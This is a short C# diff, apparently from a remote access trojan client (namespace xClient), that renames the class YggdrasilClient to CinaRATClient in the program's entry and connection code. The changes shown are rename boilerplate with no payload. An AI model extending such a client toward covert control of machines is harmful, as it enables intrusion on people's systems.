@@ -16,7 +16,7 @@ namespace xClient
 {
     internal static class Program
     {
-        public static YggdrasilClient ConnectClient;
+        public static CinaRATClient ConnectClient;
         private static ApplicationContext _msgLoop;
 
         [STAThread]
@@ -30,7 +30,7 @@ namespace xClient
             {
                 if (Initialize())
                 {
-                    if (!YggdrasilClient.Exiting)
+                    if (!CinaRATClient.Exiting)
                         ConnectClient.Connect();
                 }
             }
@@ -138,7 +138,7 @@ namespace xClient
                     }) {IsBackground = true}.Start();
                 }
 
-                ConnectClient = new YggdrasilClient(hosts);
+                ConnectClient = new CinaRATClient(hosts);
                 return true;
             }
             else
